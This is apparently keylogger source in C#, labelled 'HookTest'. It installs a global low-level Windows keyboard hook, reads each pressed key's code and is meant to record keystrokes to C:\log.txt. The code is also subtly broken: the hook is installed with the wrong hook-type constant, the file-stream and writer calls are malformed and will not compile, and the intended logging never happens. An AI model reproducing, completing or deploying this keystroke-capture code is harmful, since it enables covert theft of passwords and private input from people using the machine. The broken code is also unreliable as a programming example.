using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace HookTest
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);
        

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc hookProc = HookCallback;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static void Main(string[] args)
        {
            hookID = SetHook(hookProc);
            Console.WriteLine("Hook is set.");
            Console.ReadLine();
            UnhookWindowsHookEx(hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using(Process curProcess= Process.GetCurrentProcess())
            using(ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WM_KEYDOWN, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
            
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                using(FileStream fileStream = new FileStream("C:\\log.txt", FileAccess.Write))
                using(StreamWriter swr = new StreamWriter("C:\\log.txt", ))
                Console.WriteLine((Keys)vkCode + "\t");
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
    }








    enum Keys : int
    {
        A = 0x41,
        B = 0x42,
        C = 0x43,
        D = 0x44,
        E = 0x45,
        F = 0x46,
        G = 0x47,
        H = 0x48,
        I = 0x49,
        J = 0x4A,
        K = 0x4B,
        L = 0x4C,
        M = 0x4D,
        N = 0x4E,
        O = 0x4F,
        P = 0x50,
        Q = 0x51,
        R = 0x52,
        S = 0x53,
        T = 0x54,
        U = 0x55,
        V = 0x56,
        W = 0x57,
        X = 0x58,
        Y = 0x59,
        Z = 0x5A
    }
}
